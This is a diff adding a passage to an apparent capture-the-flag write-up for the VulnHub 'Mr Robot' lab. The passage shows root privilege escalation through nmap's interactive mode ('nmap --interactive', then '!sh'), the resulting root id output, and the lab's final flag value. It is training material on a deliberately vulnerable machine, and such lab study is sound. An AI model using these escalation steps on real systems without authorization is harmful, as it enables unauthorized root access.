@@ -3855,10 +3855,50 @@ As you can see my session crashed right at the end so you need to work fast!
 Now that we have gone over the most difficult way to priv esc I will go over the very simple way using nmap, because nmap is a binary our go to place for information is <a href="https://gtfobins.github.io/" rel="nofollow">GTFObins</a> (another essential site to bookmark!) if we go there and search for nmap we find the following site.
 <p></p>
 <div align="center">
-<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/f47ca6675d84ea0295e7e97b11c0e76be93751ae/Starting_Point/VulnHub/MrRobot/images/dirtycow.png"><br>
+<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/e7d6e4294d4b6d8d50274c62708b8e93437aa911/Starting_Point/VulnHub/MrRobot/images/gtfobins.png"><br>
 </div>
 <p></p>
+And we can see that you can spawn an interactive shell. Lets try doing that, on the target machine use the following command:
+<p></p>
 
+```
+nmap --interactive
+```
+
+<p></p>
+Followed by:
+<p></p>
+
+```
+!sh
+```
+
+<p></p>
+And we can see our command input has changed to a #, we can confirm we have succesfully carried out priv esc by checking our id.
+<p></p>
+
+```
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+```
+
+<p></p>
+We can see that we now have root privs meaning we can cd to /root and get the root flag!
+<p></p>
+
+```
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done	key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+<p></p>
 
 
 
